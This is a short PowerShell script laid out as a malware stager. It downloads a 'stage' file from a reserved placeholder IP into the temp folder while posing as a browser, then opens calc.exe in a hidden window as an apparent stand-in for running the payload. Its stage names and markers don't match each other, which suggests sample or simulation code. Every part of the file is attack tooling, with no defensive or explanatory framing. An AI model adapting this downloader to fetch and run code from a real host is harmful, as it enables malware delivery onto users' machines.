
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://203.0.113.74/stage1.ps1",
    [string]$WorkingPath = "$env:TEMP\stage1.bin",
    [int]$RequestTimeout = 65,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Get-Stage2Payload -SourceUrl $DownloadUrl -DestinationPath $WorkingPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Write-Verbose "stage marker 22 reached"
$StageMarker = "stage-17"
